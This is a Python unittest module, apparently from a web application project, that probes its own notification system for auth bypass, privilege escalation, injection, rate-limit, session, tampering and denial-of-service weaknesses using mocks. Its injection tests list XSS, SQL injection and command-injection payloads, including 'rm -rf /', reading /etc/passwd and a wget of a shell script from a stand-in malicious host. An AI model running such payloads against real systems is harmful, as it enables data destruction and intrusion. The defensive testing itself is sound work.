# Copyright (C) 2025 iolaire mcfadden.
# This program is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
Notification System Security and Penetration Testing

This module provides comprehensive security testing for the notification system,
including penetration testing, vulnerability assessment, and security validation.
"""

import unittest
import sys
import os
import time
import json
import hashlib
import hmac
import base64
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Any, Optional

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from config import Config
from app.core.database.core.database_manager import DatabaseManager
from models import User, UserRole, NotificationType, NotificationPriority, NotificationCategory
from app.services.notification.manager.unified_manager import (
    UnifiedNotificationManager, NotificationMessage, AdminNotificationMessage, SystemNotificationMessage
)
from websocket_factory import WebSocketFactory
from websocket_auth_handler import WebSocketAuthHandler
from websocket_namespace_manager import WebSocketNamespaceManager


class TestNotificationSecurityPenetration(unittest.TestCase):
    """
    Security and penetration testing for the notification system
    
    Tests:
    - Authentication and authorization bypass attempts
    - Input validation and injection attacks
    - Rate limiting and abuse prevention
    - Cross-site scripting (XSS) prevention
    - Cross-site request forgery (CSRF) protection
    - Session hijacking and fixation
    - Privilege escalation attempts
    - Data exposure and information leakage
    """
    
    def setUp(self):
        """Set up security testing environment"""
        self.config = Config()
        
        # Mock database manager
        self.mock_db_manager = Mock(spec=DatabaseManager)
        self.mock_session = Mock()
        
        # Create a proper context manager mock
        context_manager = Mock()
        context_manager.__enter__ = Mock(return_value=self.mock_session)
        context_manager.__exit__ = Mock(return_value=None)
        self.mock_db_manager.get_session.return_value = context_manager
        
        # Mock WebSocket components
        self.mock_websocket_factory = Mock(spec=WebSocketFactory)
        self.mock_auth_handler = Mock(spec=WebSocketAuthHandler)
        self.mock_namespace_manager = Mock(spec=WebSocketNamespaceManager)
        
        # Set up namespace manager with user connections
        self.mock_namespace_manager._user_connections = {
            1: {'admin_session_1'},     # Admin user
            2: {'user_session_1'},      # Regular user
            3: {'reviewer_session_1'}   # Reviewer user
        }
        
        self.mock_namespace_manager._connections = {
            'admin_session_1': Mock(namespace='/admin'),
            'user_session_1': Mock(namespace='/'),
            'reviewer_session_1': Mock(namespace='/')
        }
        
        # Create notification manager with security enabled
        self.notification_manager = UnifiedNotificationManager(
            websocket_factory=self.mock_websocket_factory,
            auth_handler=self.mock_auth_handler,
            namespace_manager=self.mock_namespace_manager,
            db_manager=self.mock_db_manager
        )
        
        # Mock user data with different roles
        self.mock_users = {
            1: Mock(id=1, username='admin', role=UserRole.ADMIN, email='admin@test.com'),
            2: Mock(id=2, username='user', role=UserRole.VIEWER, email='user@test.com'),
            3: Mock(id=3, username='reviewer', role=UserRole.REVIEWER, email='reviewer@test.com'),
            4: Mock(id=4, username='attacker', role=UserRole.VIEWER, email='attacker@test.com')
        }
        
        # Set up user role mocking
        def mock_get_user_role(user_id):
            user = self.mock_users.get(user_id)
            return user.role if user else None
        
        self.notification_manager._get_user_role = mock_get_user_role
        self.notification_manager._get_users_by_role = lambda role: [
            uid for uid, user in self.mock_users.items() if user.role == role
        ]
        self.notification_manager._get_all_active_users = lambda: list(self.mock_users.keys())
        
        # Security test tracking
        self.security_violations = []
        self.penetration_attempts = []
    
    def _record_security_violation(self, test_name: str, violation_type: str, details: str):
        """Record security violation for analysis"""
        violation = {
            'test': test_name,
            'type': violation_type,
            'details': details,
            'timestamp': datetime.now(timezone.utc).isoformat()
        }
        self.security_violations.append(violation)
        print(f"🚨 Security Violation: {violation_type} in {test_name}")
    
    def _record_penetration_attempt(self, test_name: str, attack_type: str, success: bool, details: str):
        """Record penetration attempt for analysis"""
        attempt = {
            'test': test_name,
            'attack_type': attack_type,
            'success': success,
            'details': details,
            'timestamp': datetime.now(timezone.utc).isoformat()
        }
        self.penetration_attempts.append(attempt)
        
        if success:
            print(f"🚨 Penetration Success: {attack_type} in {test_name}")
        else:
            print(f"✅ Penetration Blocked: {attack_type} in {test_name}")
    
    def test_authentication_bypass_attempts(self):
        """Test various authentication bypass techniques"""
        print("🔒 Testing authentication bypass attempts...")
        
        # Test 1: Null user ID bypass
        try:
            message = NotificationMessage(
                id="auth_bypass_001",
                type=NotificationType.INFO,
                title="Bypass Test",
                message="Testing null user bypass",
                user_id=None,  # Null user ID
                category=NotificationCategory.ADMIN
            )
            
            success = self.notification_manager.send_user_notification(None, message)
            if success:
                self._record_security_violation(
                    "authentication_bypass_attempts",
                    "NULL_USER_BYPASS",
                    "System accepted notification for null user ID"
                )
            else:
                print("✅ Null user ID bypass blocked")
        except Exception:
            print("✅ Null user ID bypass caused exception (expected)")
        
        # Test 2: Negative user ID bypass
        try:
            message = NotificationMessage(
                id="auth_bypass_002",
                type=NotificationType.INFO,
                title="Bypass Test",
                message="Testing negative user bypass",
                user_id=-1,  # Negative user ID
                category=NotificationCategory.ADMIN
            )
            
            success = self.notification_manager.send_user_notification(-1, message)
            if success:
                self._record_security_violation(
                    "authentication_bypass_attempts",
                    "NEGATIVE_USER_BYPASS",
                    "System accepted notification for negative user ID"
                )
            else:
                print("✅ Negative user ID bypass blocked")
        except Exception:
            print("✅ Negative user ID bypass caused exception (expected)")
        
        # Test 3: Non-existent user ID
        try:
            message = NotificationMessage(
                id="auth_bypass_003",
                type=NotificationType.INFO,
                title="Bypass Test",
                message="Testing non-existent user bypass",
                user_id=99999,  # Non-existent user
                category=NotificationCategory.ADMIN
            )
            
            success = self.notification_manager.send_user_notification(99999, message)
            if success:
                self._record_security_violation(
                    "authentication_bypass_attempts",
                    "NONEXISTENT_USER_BYPASS",
                    "System accepted notification for non-existent user"
                )
            else:
                print("✅ Non-existent user bypass blocked")
        except Exception:
            print("✅ Non-existent user bypass caused exception (expected)")
    
    def test_privilege_escalation_attempts(self):
        """Test privilege escalation attack vectors"""
        print("🔓 Testing privilege escalation attempts...")
        
        # Test 1: Regular user trying to send admin notifications
        regular_user_id = 2  # VIEWER role
        
        admin_message = AdminNotificationMessage(
            id="priv_esc_001",
            type=NotificationType.ERROR,
            title="Privilege Escalation Test",
            message="Regular user attempting admin notification",
            category=NotificationCategory.ADMIN,
            priority=NotificationPriority.CRITICAL,
            admin_only=True
        )
        
        success = self.notification_manager.send_user_notification(regular_user_id, admin_message)
        
        self._record_penetration_attempt(
            "privilege_escalation_attempts",
            "ADMIN_NOTIFICATION_ESCALATION",
            success,
            f"Regular user {regular_user_id} attempted to receive admin notification"
        )
        
        # Test 2: Role manipulation in message data
        try:
            malicious_message = NotificationMessage(
                id="priv_esc_002",
                type=NotificationType.INFO,
                title="Role Manipulation Test",
                message="Testing role manipulation",
                user_id=regular_user_id,
                category=NotificationCategory.SECURITY,  # Security category for non-admin
                data={
                    'user_role': 'admin',  # Attempting to set admin role in data
                    'escalated_privileges': True,
                    'bypass_auth': True
                }
            )
            
            success = self.notification_manager.send_user_notification(regular_user_id, malicious_message)
            
            self._record_penetration_attempt(
                "privilege_escalation_attempts",
                "ROLE_MANIPULATION",
                success,
                "Attempted role manipulation via message data"
            )
            
        except Exception as e:
            print(f"✅ Role manipulation blocked: {e}")
        
        # Test 3: Namespace escalation
        try:
            # Attempt to force admin namespace for regular user
            with patch.object(self.notification_manager, '_determine_target_namespace', return_value='/admin'):
                security_message = NotificationMessage(
                    id="priv_esc_003",
                    type=NotificationType.WARNING,
                    title="Namespace Escalation Test",
                    message="Testing namespace escalation",
                    user_id=regular_user_id,
                    category=NotificationCategory.SECURITY
                )
                
                success = self.notification_manager.send_user_notification(regular_user_id, security_message)
                
                self._record_penetration_attempt(
                    "privilege_escalation_attempts",
                    "NAMESPACE_ESCALATION",
                    success,
                    "Attempted to force admin namespace for regular user"
                )
                
        except Exception as e:
            print(f"✅ Namespace escalation blocked: {e}")
    
    def test_injection_attacks(self):
        """Test various injection attack vectors"""
        print("💉 Testing injection attacks...")
        
        # Test 1: XSS injection in notification content
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        for i, payload in enumerate(xss_payloads):
            try:
                xss_message = NotificationMessage(
                    id=f"xss_test_{i}",
                    type=NotificationType.INFO,
                    title=payload,  # XSS in title
                    message=payload,  # XSS in message
                    user_id=2,
                    category=NotificationCategory.SYSTEM,
                    action_url=payload  # XSS in action URL
                )
                
                success = self.notification_manager.send_user_notification(2, xss_message)
                
                # Check if payload was sanitized
                if success:
                    # In a real implementation, check if the content was sanitized
                    # For now, we assume any success with XSS payload is a vulnerability
                    if payload in str(xss_message.to_dict()):
                        self._record_security_violation(
                            "injection_attacks",
                            "XSS_INJECTION",
                            f"XSS payload not sanitized: {payload}"
                        )
                    else:
                        print(f"✅ XSS payload sanitized: {payload[:20]}...")
                
            except Exception as e:
                print(f"✅ XSS injection blocked: {payload[:20]}... - {e}")
        
        # Test 2: SQL injection in message data
        sql_payloads = [
            "'; DROP TABLE notifications; --",
            "' OR '1'='1",
            "'; INSERT INTO notifications VALUES ('malicious'); --",
            "' UNION SELECT * FROM users --"
        ]
        
        for i, payload in enumerate(sql_payloads):
            try:
                sql_message = NotificationMessage(
                    id=f"sql_test_{i}",
                    type=NotificationType.INFO,
                    title="SQL Injection Test",
                    message=payload,
                    user_id=2,
                    category=NotificationCategory.SYSTEM,
                    data={'search': payload}
                )
                
                success = self.notification_manager.send_user_notification(2, sql_message)
                
                # SQL injection should be prevented by ORM, but test anyway
                print(f"✅ SQL injection handled: {payload[:20]}...")
                
            except Exception as e:
                print(f"✅ SQL injection blocked: {payload[:20]}... - {e}")
        
        # Test 3: Command injection
        command_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/shell.sh",
            "`whoami`",
            "$(id)"
        ]
        
        for i, payload in enumerate(command_payloads):
            try:
                cmd_message = NotificationMessage(
                    id=f"cmd_test_{i}",
                    type=NotificationType.INFO,
                    title="Command Injection Test",
                    message=payload,
                    user_id=2,
                    category=NotificationCategory.SYSTEM
                )
                
                success = self.notification_manager.send_user_notification(2, cmd_message)
                print(f"✅ Command injection handled: {payload[:20]}...")
                
            except Exception as e:
                print(f"✅ Command injection blocked: {payload[:20]}... - {e}")
    
    def test_rate_limiting_bypass(self):
        """Test rate limiting bypass techniques"""
        print("🚦 Testing rate limiting bypass...")
        
        user_id = 2
        
        # Test 1: Rapid message sending
        rapid_messages = []
        for i in range(100):  # Send 100 messages rapidly
            message = NotificationMessage(
                id=f"rate_test_{i}",
                type=NotificationType.INFO,
                title=f"Rate Test {i}",
                message="Testing rate limiting",
                user_id=user_id,
                category=NotificationCategory.SYSTEM
            )
            
            success = self.notification_manager.send_user_notification(user_id, message)
            rapid_messages.append(success)
        
        # Check if rate limiting kicked in
        successful_messages = sum(rapid_messages)
        if successful_messages > 70:  # Assuming rate limit is 60/minute
            self._record_security_violation(
                "rate_limiting_bypass",
                "RATE_LIMIT_BYPASS",
                f"Sent {successful_messages} messages, expected rate limiting"
            )
        else:
            print(f"✅ Rate limiting working: {successful_messages}/100 messages sent")
        
        # Test 2: Priority message abuse
        for i in range(20):
            priority_message = NotificationMessage(
                id=f"priority_abuse_{i}",
                type=NotificationType.CRITICAL,
                title=f"Priority Abuse {i}",
                message="Abusing priority messages",
                user_id=user_id,
                category=NotificationCategory.SYSTEM,
                priority=NotificationPriority.CRITICAL
            )
            
            success = self.notification_manager.send_user_notification(user_id, priority_message)
        
        print("✅ Priority message abuse test completed")
        
        # Test 3: Different user ID rotation
        for user_id in [2, 3, 4]:
            for i in range(30):
                rotation_message = NotificationMessage(
                    id=f"rotation_{user_id}_{i}",
                    type=NotificationType.INFO,
                    title=f"Rotation Test {i}",
                    message="Testing user rotation bypass",
                    user_id=user_id,
                    category=NotificationCategory.SYSTEM
                )
                
                success = self.notification_manager.send_user_notification(user_id, rotation_message)
        
        print("✅ User rotation bypass test completed")
    
    def test_data_exposure_attacks(self):
        """Test data exposure and information leakage"""
        print("🔍 Testing data exposure attacks...")
        
        # Test 1: Sensitive data in message content
        sensitive_data = {
            'password': 'secret123',
            'api_key': 'sk-1234567890abcdef',
            'credit_card': '4111-1111-1111-1111',
            'ssn': '123-45-6789',
            'private_key': '-----BEGIN PRIVATE KEY-----'
        }
        
        for data_type, sensitive_value in sensitive_data.items():
            try:
                exposure_message = NotificationMessage(
                    id=f"exposure_{data_type}",
                    type=NotificationType.INFO,
                    title="Data Exposure Test",
                    message=f"Sensitive data: {sensitive_value}",
                    user_id=2,
                    category=NotificationCategory.SYSTEM,
                    data={data_type: sensitive_value}
                )
                
                success = self.notification_manager.send_user_notification(2, exposure_message)
                
                if success:
                    # Check if sensitive data is logged or exposed
                    message_dict = exposure_message.to_dict()
                    if sensitive_value in str(message_dict):
                        self._record_security_violation(
                            "data_exposure_attacks",
                            "SENSITIVE_DATA_EXPOSURE",
                            f"Sensitive {data_type} exposed in notification"
                        )
                    else:
                        print(f"✅ Sensitive {data_type} handled securely")
                
            except Exception as e:
                print(f"✅ Sensitive data blocked: {data_type} - {e}")
        
        # Test 2: Cross-user data leakage
        try:
            # Send message intended for user 1 but try to deliver to user 2
            cross_user_message = NotificationMessage(
                id="cross_user_test",
                type=NotificationType.INFO,
                title="Cross User Test",
                message="This should only go to user 1",
                user_id=1,  # Intended for user 1
                category=NotificationCategory.SYSTEM,
                data={'confidential': 'user_1_only_data'}
            )
            
            # Try to send to different user
            success = self.notification_manager.send_user_notification(2, cross_user_message)
            
            if success and cross_user_message.user_id != 2:
                self._record_security_violation(
                    "data_exposure_attacks",
                    "CROSS_USER_DATA_LEAKAGE",
                    "Message intended for user 1 delivered to user 2"
                )
            else:
                print("✅ Cross-user data leakage prevented")
                
        except Exception as e:
            print(f"✅ Cross-user access blocked: {e}")
    
    def test_session_security_attacks(self):
        """Test session-related security attacks"""
        print("🔐 Testing session security attacks...")
        
        # Test 1: Session fixation
        try:
            # Attempt to fix session ID
            fixed_session_id = "attacker_controlled_session_123"
            
            # Mock session fixation attempt
            with patch.object(self.mock_namespace_manager, '_user_connections', 
                            {2: {fixed_session_id}}):
                
                message = NotificationMessage(
                    id="session_fixation_test",
                    type=NotificationType.INFO,
                    title="Session Fixation Test",
                    message="Testing session fixation",
                    user_id=2,
                    category=NotificationCategory.SYSTEM
                )
                
                success = self.notification_manager.send_user_notification(2, message)
                
                # Check if fixed session was used
                if success:
                    print("⚠️ Session fixation test completed (check session validation)")
                
        except Exception as e:
            print(f"✅ Session fixation blocked: {e}")
        
        # Test 2: Session hijacking simulation
        try:
            # Simulate hijacked session
            legitimate_user = 1
            attacker_user = 4
            
            # Attacker tries to use legitimate user's session
            hijacked_message = NotificationMessage(
                id="session_hijack_test",
                type=NotificationType.INFO,
                title="Session Hijack Test",
                message="Attacker using hijacked session",
                user_id=attacker_user,
                category=NotificationCategory.ADMIN  # Try to access admin content
            )
            
            # Mock hijacked session
            with patch.object(self.notification_manager, '_get_user_role', 
                            return_value=UserRole.ADMIN):
                success = self.notification_manager.send_user_notification(attacker_user, hijacked_message)
                
                if success:
                    self._record_security_violation(
                        "session_security_attacks",
                        "SESSION_HIJACKING",
                        "Attacker successfully used hijacked session"
                    )
                else:
                    print("✅ Session hijacking prevented")
                    
        except Exception as e:
            print(f"✅ Session hijacking blocked: {e}")
    
    def test_message_tampering_attacks(self):
        """Test message integrity and tampering attacks"""
        print("🔧 Testing message tampering attacks...")
        
        # Test 1: Message content tampering
        original_message = NotificationMessage(
            id="tamper_test_001",
            type=NotificationType.INFO,
            title="Original Message",
            message="Original content",
            user_id=2,
            category=NotificationCategory.SYSTEM,
            priority=NotificationPriority.NORMAL
        )
        
        # Simulate tampering
        tampered_data = original_message.to_dict()
        tampered_data['message'] = "Tampered content with malicious payload"
        tampered_data['priority'] = NotificationPriority.CRITICAL.value
        tampered_data['category'] = NotificationCategory.ADMIN.value
        
        try:
            # Attempt to create message from tampered data
            tampered_message = NotificationMessage.from_dict(tampered_data)
            success = self.notification_manager.send_user_notification(2, tampered_message)
            
            if success and tampered_message.category == NotificationCategory.ADMIN:
                self._record_security_violation(
                    "message_tampering_attacks",
                    "MESSAGE_TAMPERING",
                    "Tampered message with elevated category accepted"
                )
            else:
                print("✅ Message tampering handled")
                
        except Exception as e:
            print(f"✅ Message tampering blocked: {e}")
        
        # Test 2: Timestamp manipulation
        try:
            future_message = NotificationMessage(
                id="timestamp_tamper_001",
                type=NotificationType.INFO,
                title="Future Message",
                message="Message from the future",
                user_id=2,
                category=NotificationCategory.SYSTEM,
                timestamp=datetime.now(timezone.utc) + timedelta(days=365)  # Future timestamp
            )
            
            success = self.notification_manager.send_user_notification(2, future_message)
            print("✅ Future timestamp handled")
            
        except Exception as e:
            print(f"✅ Timestamp tampering blocked: {e}")
    
    def test_denial_of_service_attacks(self):
        """Test denial of service attack vectors"""
        print("💥 Testing denial of service attacks...")
        
        # Test 1: Large message payload
        try:
            large_payload = "A" * 1000000  # 1MB payload
            
            dos_message = NotificationMessage(
                id="dos_large_payload",
                type=NotificationType.INFO,
                title="DoS Test",
                message=large_payload,
                user_id=2,
                category=NotificationCategory.SYSTEM
            )
            
            start_time = time.time()
            success = self.notification_manager.send_user_notification(2, dos_message)
            end_time = time.time()
            
            processing_time = end_time - start_time
            
            if processing_time > 5.0:  # More than 5 seconds
                self._record_security_violation(
                    "denial_of_service_attacks",
                    "LARGE_PAYLOAD_DOS",
                    f"Large payload caused {processing_time:.2f}s processing time"
                )
            else:
                print(f"✅ Large payload handled in {processing_time:.2f}s")
                
        except Exception as e:
            print(f"✅ Large payload blocked: {e}")
        
        # Test 2: Deeply nested data structures
        try:
            # Create deeply nested dictionary
            nested_data = {}
            current = nested_data
            for i in range(1000):  # Very deep nesting
                current['level'] = {}
                current = current['level']
            
            nested_message = NotificationMessage(
                id="dos_nested_data",
                type=NotificationType.INFO,
                title="Nested DoS Test",
                message="Testing nested data DoS",
                user_id=2,
                category=NotificationCategory.SYSTEM,
                data=nested_data
            )
            
            start_time = time.time()
            success = self.notification_manager.send_user_notification(2, nested_message)
            end_time = time.time()
            
            processing_time = end_time - start_time
            
            if processing_time > 3.0:
                self._record_security_violation(
                    "denial_of_service_attacks",
                    "NESTED_DATA_DOS",
                    f"Nested data caused {processing_time:.2f}s processing time"
                )
            else:
                print(f"✅ Nested data handled in {processing_time:.2f}s")
                
        except Exception as e:
            print(f"✅ Nested data attack blocked: {e}")
    
    def generate_security_report(self) -> Dict[str, Any]:
        """Generate comprehensive security test report"""
        return {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'security_violations': self.security_violations,
            'penetration_attempts': self.penetration_attempts,
            'summary': {
                'total_violations': len(self.security_violations),
                'total_penetration_attempts': len(self.penetration_attempts),
                'successful_penetrations': len([a for a in self.penetration_attempts if a['success']]),
                'security_score': max(0, 100 - (len(self.security_violations) * 10) - 
                                    (len([a for a in self.penetration_attempts if a['success']]) * 20))
            }
        }
    
    def tearDown(self):
        """Clean up and print security summary"""
        report = self.generate_security_report()
        
        print("\n" + "=" * 60)
        print("SECURITY TEST SUMMARY")
        print("=" * 60)
        print(f"Security Violations: {report['summary']['total_violations']}")
        print(f"Penetration Attempts: {report['summary']['total_penetration_attempts']}")
        print(f"Successful Penetrations: {report['summary']['successful_penetrations']}")
        print(f"Security Score: {report['summary']['security_score']}/100")
        
        if report['summary']['total_violations'] == 0 and report['summary']['successful_penetrations'] == 0:
            print("🎉 ALL SECURITY TESTS PASSED!")
        else:
            print("⚠️ SECURITY ISSUES DETECTED - REVIEW REQUIRED")
        
        print("=" * 60)


def run_security_penetration_tests():
    """Run comprehensive security and penetration tests"""
    print("🔒 NOTIFICATION SYSTEM SECURITY AND PENETRATION TESTING")
    print("=" * 70)
    
    # Run security tests
    suite = unittest.TestLoader().loadTestsFromTestCase(TestNotificationSecurityPenetration)
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    return len(result.failures) == 0 and len(result.errors) == 0


if __name__ == '__main__':
    success = run_security_penetration_tests()
    sys.exit(0 if success else 1)